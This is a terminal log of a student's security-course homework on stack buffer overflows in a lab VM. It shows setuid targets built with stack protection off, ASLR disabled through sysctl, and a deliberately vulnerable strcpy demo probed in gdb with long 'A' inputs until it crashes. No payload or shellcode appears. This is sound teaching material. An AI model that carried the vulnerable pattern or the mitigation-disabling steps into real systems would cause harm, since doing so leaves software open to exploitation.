Last login: Sun Nov 24 14:25:22 on ttys001
adam@Adams-MacBook-Pro ~ % cd Documents/ct/sec-priv/assignments 
adam@Adams-MacBook-Pro assignments % ls
hw1	hw2	hw3
adam@Adams-MacBook-Pro assignments % mkdir hw4
adam@Adams-MacBook-Pro assignments % ls
hw1	hw2	hw3	hw4
adam@Adams-MacBook-Pro assignments % cd hw4
adam@Adams-MacBook-Pro hw4 % ls
adam@Adams-MacBook-Pro hw4 % git clone https://github.com/Bijeeta/cs5435-fa19-hw4.git
Cloning into 'cs5435-fa19-hw4'...
remote: Enumerating objects: 28, done.
remote: Counting objects: 100% (28/28), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 28 (delta 6), reused 25 (delta 6), pack-reused 0
Unpacking objects: 100% (28/28), done.
adam@Adams-MacBook-Pro hw4 % ls
cs5435-fa19-hw4
adam@Adams-MacBook-Pro hw4 % sublime cs5435-fa19-hw4 
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
The authenticity of host '[localhost]:2224 ([127.0.0.1]:2224)' can't be established.
ECDSA key fingerprint is SHA256:ukWz7uOp/7q2aM6xFb+pwWYJNRytS2G3K4JCNoCF5Lc.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[localhost]:2224' (ECDSA) to the list of known hosts.
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

305 packages can be updated.
231 updates are security updates.

Last login: Tue Nov  5 20:22:26 2019 from 10.0.2.2
student@5435-hw4-vm:~$ ls
demo     Documents  examples.desktop  Pictures  Templates
Desktop  Downloads  Music             Public    Videos
student@5435-hw4-vm:~$ cd demo
student@5435-hw4-vm:~/demo$ ls
get_sp  get_sp.c  meet  meet.c  meet_orig  meet_orig.c  sc
student@5435-hw4-vm:~/demo$ cd ..
student@5435-hw4-vm:~$ git clone https://github.com/Bijeeta/cs5435-fa19-hw4.git
The program 'git' is currently not installed. You can install it by typing:
sudo apt install git
student@5435-hw4-vm:~$ sudo apt install git
[sudo] password for student: 
E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)
E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?
student@5435-hw4-vm:~$ apt install git
E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?
student@5435-hw4-vm:~$ apt install git
E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?
student@5435-hw4-vm:~$ apt install git
E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)
E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), are you root?
student@5435-hw4-vm:~$ sudo apt install git
E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)
E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?
student@5435-hw4-vm:~$ Connection to localhost closed by remote host.
Connection to localhost closed.
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
ssh: connect to host localhost port 2224: Connection refused
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
ssh: connect to host localhost port 2224: Connection refused
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
  [Restored Nov 26, 2019 at 10:43:47 AM]
Last login: Tue Nov 26 10:43:46 on ttys001
adam@Adams-MacBook-Pro hw4 % ssh -p 2224 student@localhost
student@localhost's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-45-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

295 packages can be updated.
224 updates are security updates.

Last login: Tue Nov  5 20:22:26 2019 from 10.0.2.2
student@5435-hw4-vm:~$ git clone https://github.com/Bijeeta/cs5435-fa19-hw4.git
The program 'git' is currently not installed. You can install it by typing:
sudo apt install git
student@5435-hw4-vm:~$ sudo apt install git
[sudo] password for student: 
E: Could not get lock /var/lib/dpkg/lock-frontend - open (11: Resource temporarily unavailable)
E: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?
student@5435-hw4-vm:~$ pwd
/home/student
student@5435-hw4-vm:~$ ls
cs5435-fa19-hw4  Desktop    Downloads         Music     Public     Videos
demo             Documents  examples.desktop  Pictures  Templates
student@5435-hw4-vm:~$ cd cs
-bash: cd: cs: No such file or directory
student@5435-hw4-vm:~$ cd cs5435-fa19-hw4/
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd targets/
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ ls
Makefile  target0.c  target1.c  target2.c  target3.c  target4.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ sudo make
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target0 target0.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target1 target1.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target2 target2.c
gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector -o target3 target3.c
gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -o target4 target4.c
install -o root -t /tmp target0 target1 target2 target3 target4
chmod 4755 /tmp/target*
student@5435-hw4-vm:~/cs5435-fa19-hw4/targets$ cd ..
student@5435-hw4-vm:~/cs5435-fa19-hw4$ ls
demo  README.txt  sploits  targets
student@5435-hw4-vm:~/cs5435-fa19-hw4$ cd demo
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp.c  meet.c  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gcc - ggdb - mpreferred - stack - boundary =2 - zexecstack -fno - stack - protector meet .c -o meet
gcc: error: ggdb: No such file or directory
gcc: error: mpreferred: No such file or directory
gcc: error: stack: No such file or directory
gcc: error: boundary: No such file or directory
gcc: error: =2: No such file or directory
gcc: error: zexecstack: No such file or directory
gcc: error: stack: No such file or directory
gcc: error: protector: No such file or directory
gcc: error: meet: No such file or directory
gcc: error: .c: No such file or directory
gcc: error: unrecognized command line option ‘-fno’
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ sudo sysctl -w kernel . randomize_va_space =0
sysctl: "kernel" must be of the form name=value
sysctl: "." must be of the form name=value
sysctl: "randomize_va_space" must be of the form name=value
sysctl: malformed setting "=0"
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp.c  meet.c  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector meet.c -o meet
meet.c:5:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 greeting( char* temp1)
 ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdp -q meet
No command 'gdp' found, but there are 16 similar ones
gdp: command not found
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
\Reading symbols from meet...done.
(gdb) `perl -e 'print "A"x399'`
Undefined command: "".  Try "help".
(gdb) run `perl -e 'print "A"x399'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x399'`
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye 
[Inferior 1 (process 1827) exited normally]
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye 

Program received signal SIGSEGV, Segmentation fault.
_dl_fixup (l=0x0, reloc_arg=3086731376) at dl-runtime.c:69
69	dl-runtime.c: No such file or directory.
(gdb) b 8
Breakpoint 1 at 0xb7fe97e0: file dl-runtime.c, line 8.
(gdb) run `perl -e 'print "A"x400'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 1, _dl_fixup (l=0xb7fff918, reloc_arg=24) at dl-runtime.c:66
66	dl-runtime.c: No such file or directory.
(gdb) q
A debugging session is active.

	Inferior 1 [process 27873] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp.c  meet  meet.c  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector meet.c -o meet
meet.c:5:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
 greeting( char* temp1)
 ^
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 8
Breakpoint 1 at 0x80484a4: file meet.c, line 8.
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 1, greeting (temp1=0xbffff62b 'A' <repeats 200 times>...)
    at meet.c:8
8		memset(name, 0, 400);
(gdb) info frame
Stack level 0, frame at 0xbffff434:
 eip = 0x80484a4 in greeting (meet.c:8); saved eip = 0x80484f4
 called by frame at 0xbffff440
 source language c.
 Arglist at 0xbffff42c, args: temp1=0xbffff62b 'A' <repeats 200 times>...
 Locals at 0xbffff42c, Previous frame's sp is 0xbffff434
 Saved registers:
  ebp at 0xbffff42c, eip at 0xbffff430
(gdb) 0xbffff430-32
[1]+  Stopped                 gdb -q meet
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 8
Breakpoint 1 at 0x80484a4: file meet.c, line 8.
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 1, greeting (temp1=0xbffff62b 'A' <repeats 200 times>...)
    at meet.c:8
8		memset(name, 0, 400);
(gdb) info frame
Stack level 0, frame at 0xbffff434:
 eip = 0x80484a4 in greeting (meet.c:8); saved eip = 0x80484f4
 called by frame at 0xbffff440
 source language c.
 Arglist at 0xbffff42c, args: temp1=0xbffff62b 'A' <repeats 200 times>...
 Locals at 0xbffff42c, Previous frame's sp is 0xbffff434
 Saved registers:
  ebp at 0xbffff42c, eip at 0xbffff430
(gdb) x/64x 0xbffff430-32
0xbffff410:	0x00000002	0xbffff4d4	0xbffff4e0	0x08048531
0xbffff420:	0xb7fbb3dc	0x0804821c	0x08048519	0xbffff438
0xbffff430:	0x080484f4	0xbffff62b	0x00000000	0xb7e21637
0xbffff440:	0x00000002	0xbffff4d4	0xbffff4e0	0x00000000
0xbffff450:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffff460:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffff470:	0x00000000	0x8e23fdc6	0xb5e093d6	0x00000000
0xbffff480:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffff490:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffff4a0:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffff4b0:	0x080484e3	0x00000002	0xbffff4d4	0x08048510
0xbffff4c0:	0x08048570	0xb7fea880	0xbffff4cc	0xb7fff918
0xbffff4d0:	0x00000002	0xbffff603	0xbffff62b	0x00000000
0xbffff4e0:	0xbffff7bc	0xbffff7cd	0xbffff7dd	0xbffff7f1
0xbffff4f0:	0xbffff80e	0xbffff821	0xbffff82e	0xbffffdb6
0xbffff500:	0xbffffdc1	0xbffffe54	0xbffffe6b	0xbffffe7a
(gdb) n
9		strcpy(name, temp1);
(gdb) x/64x 0xbffff430-32
0xbffff410:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffff420:	0x00000000	0x00000000	0x00000000	0xbffff438
0xbffff430:	0x080484f4	0xbffff62b	0x00000000	0xb7e21637
0xbffff440:	0x00000002	0xbffff4d4	0xbffff4e0	0x00000000
0xbffff450:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffff460:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffff470:	0x00000000	0x8e23fdc6	0xb5e093d6	0x00000000
0xbffff480:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffff490:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffff4a0:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffff4b0:	0x080484e3	0x00000002	0xbffff4d4	0x08048510
0xbffff4c0:	0x08048570	0xb7fea880	0xbffff4cc	0xb7fff918
0xbffff4d0:	0x00000002	0xbffff603	0xbffff62b	0x00000000
0xbffff4e0:	0xbffff7bc	0xbffff7cd	0xbffff7dd	0xbffff7f1
0xbffff4f0:	0xbffff80e	0xbffff821	0xbffff82e	0xbffffdb6
0xbffff500:	0xbffffdc1	0xbffffe54	0xbffffe6b	0xbffffe7a
(gdb) n
10		printf( "Hi %s\n", name );
(gdb) x/64x 0xbffff430-32
0xbffff410:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff420:	0x41414141	0x41414141	0x41414141	0xbffff400
0xbffff430:	0x080484f4	0xbffff62b	0x00000000	0xb7e21637
0xbffff440:	0x00000002	0xbffff4d4	0xbffff4e0	0x00000000
0xbffff450:	0x00000000	0x00000000	0xb7fbb000	0xb7fffc04
0xbffff460:	0xb7fff000	0x00000000	0xb7fbb000	0xb7fbb000
0xbffff470:	0x00000000	0x8e23fdc6	0xb5e093d6	0x00000000
0xbffff480:	0x00000000	0x00000000	0x00000002	0x080483a0
0xbffff490:	0x00000000	0xb7ff0010	0xb7fea880	0xb7fff000
0xbffff4a0:	0x00000002	0x080483a0	0x00000000	0x080483c1
0xbffff4b0:	0x080484e3	0x00000002	0xbffff4d4	0x08048510
0xbffff4c0:	0x08048570	0xb7fea880	0xbffff4cc	0xb7fff918
0xbffff4d0:	0x00000002	0xbffff603	0xbffff62b	0x00000000
0xbffff4e0:	0xbffff7bc	0xbffff7cd	0xbffff7dd	0xbffff7f1
0xbffff4f0:	0xbffff80e	0xbffff821	0xbffff82e	0xbffffdb6
0xbffff500:	0xbffffdc1	0xbffffe54	0xbffffe6b	0xbffffe7a
(gdb) n
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
11	}
(gdb) n
main (argc=1094795585, argv=0x41414141) at meet.c:17
17		printf( "Bye \n" );
(gdb) n
Bye 
18	}
(gdb) n
_dl_fixup (l=0x0, reloc_arg=3086731376) at dl-runtime.c:72
72	dl-runtime.c: No such file or directory.
(gdb) n
69	in dl-runtime.c
(gdb) n

Program received signal SIGSEGV, Segmentation fault.
_dl_fixup (l=0x0, reloc_arg=3086731376) at dl-runtime.c:69
69	in dl-runtime.c
(gdb) n

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) n
The program is not being run.
(gdb) 
The program is not being run.
(gdb) 
The program is not being run.
(gdb) 
The program is not being run.
(gdb) 
The program is not being run.
(gdb) b 16
Breakpoint 2 at 0xb7fe97e0: file dl-runtime.c, line 16.
(gdb) info frame
No stack.
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 2, _dl_fixup (l=0xb7fff918, reloc_arg=24) at dl-runtime.c:66
66	dl-runtime.c: No such file or directory.
(gdb) q
A debugging session is active.

	Inferior 1 [process 10594] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 16
Breakpoint 1 at 0x80484e6: file meet.c, line 16.
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 1, main (argc=2, argv=0xbffff4d4) at meet.c:16
16		greeting( argv[1] );
(gdb) info frame
Stack level 0, frame at 0xbffff440:
 eip = 0x80484e6 in main (meet.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff438, args: argc=2, argv=0xbffff4d4
 Locals at 0xbffff438, Previous frame's sp is 0xbffff440
 Saved registers:
  ebp at 0xbffff438, eip at 0xbffff43c
(gdb) n
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye 

Program received signal SIGSEGV, Segmentation fault.
_dl_fixup (l=0x0, reloc_arg=3086731376) at dl-runtime.c:69
69	dl-runtime.c: No such file or directory.
(gdb) n

Program terminated with signal SIGSEGV, Segmentation fault.
The program no longer exists.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 16
Breakpoint 1 at 0x80484e6: file meet.c, line 16.
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 1, main (argc=2, argv=0xbffff4d4) at meet.c:16
16		greeting( argv[1] );
(gdb) info frame
Stack level 0, frame at 0xbffff440:
 eip = 0x80484e6 in main (meet.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff438, args: argc=2, argv=0xbffff4d4
 Locals at 0xbffff438, Previous frame's sp is 0xbffff440
 Saved registers:
  ebp at 0xbffff438, eip at 0xbffff43c
(gdb) n
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye 

Program received signal SIGSEGV, Segmentation fault.
_dl_fixup (l=0x0, reloc_arg=3086731376) at dl-runtime.c:69
69	dl-runtime.c: No such file or directory.
(gdb) info frame
Stack level 0, frame at 0xbffff41c:
 eip = 0xb7fe97f7 in _dl_fixup (dl-runtime.c:69); saved eip = 0xb7ff0010
 called by frame at 0xbffff434
 source language c.
 Arglist at 0xbffff3e0, args: l=0x0, reloc_arg=3086731376
 Locals at 0xbffff3e0, Previous frame's sp is 0xbffff41c
 Saved registers:
  ebx at 0xbffff408, ebp at 0xbffff414, esi at 0xbffff40c, edi at 0xbffff410,
  eip at 0xbffff418
(gdb) q
A debugging session is active.

	Inferior 1 [process 10609] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ ls
get_sp.c  meet  meet.c  simpleargs.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ cat meet.c
#include <stdio.h>
#include <string.h>


greeting( char* temp1)
{
	char name[400];
	memset(name, 0, 400);
	strcpy(name, temp1);
	printf( "Hi %s\n", name );
}


int main(int argc, char* argv[] ) 
{
	greeting( argv[1] );
	printf( "Bye \n" );
}
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ vi meet.c
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 15
Breakpoint 1 at 0x80484e6: file meet.c, line 15.
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 1, main (argc=2, argv=0xbffff4d4) at meet.c:16
16		greeting( argv[1] );
(gdb) info frame
Stack level 0, frame at 0xbffff440:
 eip = 0x80484e6 in main (meet.c:16); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff438, args: argc=2, argv=0xbffff4d4
 Locals at 0xbffff438, Previous frame's sp is 0xbffff440
 Saved registers:
  ebp at 0xbffff438, eip at 0xbffff43c
(gdb) n
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bye 

Program received signal SIGSEGV, Segmentation fault.
_dl_fixup (l=0x0, reloc_arg=3086731376) at dl-runtime.c:69
69	dl-runtime.c: No such file or directory.
(gdb) q
A debugging session is active.

	Inferior 1 [process 10633] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 15
Breakpoint 1 at 0x80484e6: file meet.c, line 15.
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 1, main (argc=2, argv=0xbffff4d4) at meet.c:16
16		greeting( argv[1] );
(gdb) step
greeting (temp1=0xbffff62b 'A' <repeats 200 times>...) at meet.c:8
8		memset(name, 0, 400);
(gdb) info frame
Stack level 0, frame at 0xbffff434:
 eip = 0x80484a4 in greeting (meet.c:8); saved eip = 0x80484f4
 called by frame at 0xbffff440
 source language c.
 Arglist at 0xbffff42c, args: temp1=0xbffff62b 'A' <repeats 200 times>...
 Locals at 0xbffff42c, Previous frame's sp is 0xbffff434
 Saved registers:
  ebp at 0xbffff42c, eip at 0xbffff430
(gdb) step
__memset_sse2_rep () at ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S:90
90	../sysdeps/i386/i686/multiarch/memset-sse2-rep.S: No such file or directory.
(gdb) step
92	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step
96	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step
97	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step
99	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step
100	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step
101	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step
103	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step
104	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step
105	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
235	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
236	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
238	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
239	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
242	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
243	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
244	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
245	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
246	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
247	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
248	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
252	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
253	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) nn
Undefined command: "nn".  Try "help".
(gdb) n
260	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
266	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
267	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
268	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
274	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
275	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
276	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
284	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) nn
Undefined command: "nn".  Try "help".
(gdb) n
285	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
286	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) n
288	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step
289	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step
290	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step 30
298	in ../sysdeps/i386/i686/multiarch/memset-sse2-rep.S
(gdb) step 900
Cannot find bounds of current function
(gdb) steo 30
Undefined command: "steo".  Try "help".
(gdb) step 30
Cannot find bounds of current function
(gdb) step
Cannot find bounds of current function
(gdb) q
A debugging session is active.

	Inferior 1 [process 10641] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/demo$ gdb -q meet
Reading symbols from meet...done.
(gdb) b 7
Breakpoint 1 at 0x80484a4: file meet.c, line 7.
(gdb) run `perl -e 'print "A"x400'`
Starting program: /home/student/cs5435-fa19-hw4/demo/meet `perl -e 'print "A"x400'`

Breakpoint 1, greeting (temp1=0xbffff62b 'A' <repeats 200 times>...)
    at meet.c:8
8		memset(name, 0, 400);
(gdb) info frame
Stack level 0, frame at 0xbffff434:
 eip = 0x80484a4 in greeting (meet.c:8); saved eip = 0x80484f4
 called by frame at 0xbffff440
 source language c.
 Arglist at 0xbffff42c, args: temp1=0xbffff62b 'A' <repeats 200 times>...
 Locals at 0xbffff42c, Previous frame's sp is 0xbffff434
 Saved registers:
